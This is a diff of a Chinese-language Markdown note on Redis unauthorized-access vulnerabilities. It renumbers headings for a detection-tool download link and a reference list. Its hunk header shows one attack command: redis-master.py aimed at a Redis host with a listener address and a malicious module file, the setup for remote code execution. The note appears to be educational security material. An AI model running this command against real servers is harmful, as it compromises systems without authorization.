@@ -223,14 +223,10 @@ python3 redis-master.py -r 127.0.0.1 -p 6379 -L 192.168.80.141 -P 8888 -f RedisM
 
 
 
-
-
-
-
-## 3、检测未授权访问漏洞检测工具
+## 1.4、检测未授权访问漏洞检测工具
 
 [下载地址](https://github.com/xk11z/unauthorized_com)
 
-## 4、参考
+## 1.5、参考
 
 - [面试经典 Redis未授权漏洞与组合拳](https://www.freebuf.com/vuls/349094.html)
